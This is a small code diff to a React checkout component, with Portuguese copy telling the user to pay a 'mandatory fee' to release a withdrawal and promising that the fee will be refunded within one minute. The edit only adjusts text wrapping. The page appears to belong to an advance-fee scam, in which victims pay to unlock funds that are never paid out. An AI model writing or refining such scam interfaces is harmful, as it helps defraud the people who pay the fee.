@@ -146,8 +146,8 @@ const Checkout = () => {
               </div>
               <p className="text-xs text-gray-500 leading-relaxed">
                 Taxa obrigatória para liberação do saque no valor de{" "}
-                <span className="font-bold text-black">R$ {TARGET.toFixed(2).replace(".", ",")}</span>. O valor de{" "}
-                <span className="font-bold text-primary">R$ {TAX.toFixed(2).replace(".", ",")}</span> será reembolsado integralmente para você em 1 minuto.
+                <span className="font-bold text-black" style={{ whiteSpace: "nowrap" }}>R$&nbsp;{TARGET.toFixed(2).replace(".", ",")}</span>. O valor de{" "}
+                <span className="font-bold text-primary" style={{ whiteSpace: "nowrap" }}>R$&nbsp;{TAX.toFixed(2).replace(".", ",")}</span> será reembolsado integralmente para você em 1 minuto.
               </p>
             </div>
 
